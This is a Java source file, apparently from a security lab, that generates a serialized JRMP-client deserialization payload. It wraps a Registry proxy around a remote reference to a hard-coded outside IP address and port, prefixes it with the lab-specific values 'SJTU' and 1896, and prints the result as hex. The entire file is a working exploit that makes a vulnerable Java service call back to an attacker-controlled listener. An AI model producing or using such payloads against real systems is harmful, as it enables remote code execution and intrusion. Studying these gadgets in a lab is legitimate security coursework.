package lab3;

import lab1.Utils;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Proxy;
import java.rmi.activation.ActivationInstantiator;
import java.rmi.activation.ActivationMonitor;
import java.rmi.activation.ActivationSystem;
import java.rmi.activation.Activator;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.util.Random;

public class JrmpListener {
    public static void main(String[] args) throws Exception{
        ObjID objID = new ObjID(new Random().nextInt()); // 对象标识符
        TCPEndpoint tcpEndpoint = new TCPEndpoint("82.156.2.166",2444); // 与远程的RMI服务连接
        UnicastRef unicastRef = new UnicastRef(new LiveRef(objID, tcpEndpoint, false)); // \
        RemoteObjectInvocationHandler rih = new RemoteObjectInvocationHandler(unicastRef);
        Registry registry = (Registry) Proxy.newProxyInstance(JrmpListener.class.getClassLoader(), new Class[]{Registry.class}, rih); // 通过反射

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream os = new ObjectOutputStream(bos);
        os.writeUTF("SJTU");
        os.writeInt(1896);
        os.writeObject(registry);
        os.close();

        System.out.println(Utils.bytesTohexString(bos.toByteArray()));

        // for test
//        ByteArrayInputStream bis = new ByteArrayInputStream(bos.toByteArray());
//        ObjectInputStream ois = new ObjectInputStream(bis);
//        ois.readObject();
    }

}
